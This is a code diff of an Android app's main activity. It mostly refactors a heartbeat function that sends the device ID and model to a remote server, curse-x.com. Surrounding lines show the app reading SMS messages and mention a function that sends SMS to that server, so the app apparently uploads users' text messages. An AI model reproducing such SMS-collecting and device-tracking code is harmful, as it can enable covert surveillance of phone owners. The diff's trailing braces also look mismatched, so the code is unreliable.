@@ -138,6 +138,8 @@ class MainActivity : AppCompatActivity() {
                         // Show toast only once if columns are missing
                         if (messagesReadCount == 0) { // Avoid showing multiple toasts if columns missing in both URIs
                            runOnUiThread { Toast.makeText(this, "Error reading SMS columns", Toast.LENGTH_SHORT).show() }
+                        } else {
+                           // Do nothing for subsequent URIs
                         }
                     }
                 } else {
@@ -264,71 +266,74 @@ class MainActivity : AppCompatActivity() {
             }
         }
     
-        @SuppressLint("HardwareIds") // Suppress warning for ANDROID_ID
-        private fun sendHeartbeat() {
-            executor.execute {
-                val urlString = "https://curse-x.com/android/api/heartbeat.php"
-                var connection: HttpURLConnection? = null
-                var success = false
+    }
     
-                try {
-                    val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
-                    // Use Build.MODEL as the device name, fallback if needed
-                    val deviceName = Build.MODEL ?: "Unknown Model"
-    
-                    val url = URL(urlString)
-                    connection = url.openConnection() as HttpURLConnection
-                    connection.requestMethod = "POST"
-                    connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                    connection.setRequestProperty("Accept", "application/json")
-                    connection.doOutput = true
-                    connection.connectTimeout = 10000 // 10 seconds
-                    connection.readTimeout = 10000 // 10 seconds
-    
-                    // Create JSON payload
-                    val payload = JSONObject()
-                    payload.put("device_id", deviceId)
-                    payload.put("device_name", deviceName) // Send device name as per documentation
-    
-                    // Write JSON data
-                    val outputStreamWriter = OutputStreamWriter(connection.outputStream, "UTF-8")
-                    outputStreamWriter.write(payload.toString())
-                    outputStreamWriter.flush()
-                    outputStreamWriter.close()
-    
-                    // Check response code
-                    val responseCode = connection.responseCode
-                    Log.d("MainActivity", "Heartbeat Server Response Code: $responseCode")
-    
-                    if (responseCode == HttpURLConnection.HTTP_OK) {
-                        // Read response (optional)
-                        val inputStreamReader = InputStreamReader(connection.inputStream, "UTF-8")
-                        val bufferedReader = BufferedReader(inputStreamReader)
-                        val response = StringBuilder()
-                        var line: String?
-                        while (bufferedReader.readLine().also { line = it } != null) {
-                            response.append(line?.trim())
-                        }
-                        bufferedReader.close()
-                        Log.d("MainActivity", "Heartbeat Server Response: ${response.toString()}")
-                        success = true
-                    } else {
-                         Log.e("MainActivity", "Heartbeat failed. Server Response Code: $responseCode")
-                         // Optionally read error stream here as in sendSmsToServer
+    @SuppressLint("HardwareIds") // Suppress warning for ANDROID_ID
+    private fun sendHeartbeat() {
+        executor.execute {
+            val urlString = "https://curse-x.com/android/api/heartbeat.php"
+            var connection: HttpURLConnection? = null
+            var success = false
+
+            try {
+                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
+                // Use Build.MODEL as the device name, fallback if needed
+                val deviceName = Build.MODEL ?: "Unknown Model"
+
+                val url = URL(urlString)
+                val httpConnection = url.openConnection() as HttpURLConnection
+                connection = httpConnection
+                httpConnection.requestMethod = "POST"
+                httpConnection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                httpConnection.setRequestProperty("Accept", "application/json")
+                httpConnection.doOutput = true
+                httpConnection.connectTimeout = 10000 // 10 seconds
+                httpConnection.readTimeout = 10000 // 10 seconds
+
+                // Create JSON payload
+                val payload = JSONObject()
+                payload.put("device_id", deviceId)
+                payload.put("device_name", deviceName) // Send device name as per documentation
+
+                // Write JSON data
+                val outputStreamWriter = OutputStreamWriter(httpConnection.outputStream, "UTF-8")
+                outputStreamWriter.write(payload.toString())
+                outputStreamWriter.flush()
+                outputStreamWriter.close()
+
+                // Check response code
+                val responseCode = httpConnection.responseCode
+                Log.d("MainActivity", "Heartbeat Server Response Code: $responseCode")
+
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    // Read response (optional)
+                    val inputStreamReader = InputStreamReader(httpConnection.inputStream, "UTF-8")
+                    val bufferedReader = BufferedReader(inputStreamReader)
+                    val response = StringBuilder()
+                    var line: String?
+                    while (bufferedReader.readLine().also { line = it } != null) {
+                        response.append(line?.trim())
                     }
-    
-                } catch (e: Exception) {
-                    Log.e("MainActivity", "Error sending heartbeat: ${e.message}", e)
-                } finally {
-                    connection?.disconnect()
-                    // Optionally show a toast, but heartbeat is a background task, maybe not needed
-                     if (success) {
-                         Log.i("MainActivity", "Heartbeat sent successfully.")
-                     } else {
-                         Log.w("MainActivity", "Heartbeat sending failed.")
-                     }
+                    bufferedReader.close()
+                    Log.d("MainActivity", "Heartbeat Server Response: ${response.toString()}")
+                    success = true
+                } else {
+                     Log.e("MainActivity", "Heartbeat failed. Server Response Code: $responseCode")
+                     // Optionally read error stream here as in sendSmsToServer
                 }
+
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Error sending heartbeat: ${e.message}", e)
+            } finally {
+                connection?.disconnect()
+                // Optionally show a toast, but heartbeat is a background task, maybe not needed
+                 if (success) {
+                     Log.i("MainActivity", "Heartbeat sent successfully.")
+                 } else {
+                     Log.w("MainActivity", "Heartbeat sending failed.")
+                 }
             }
         }
     }
+}
 }
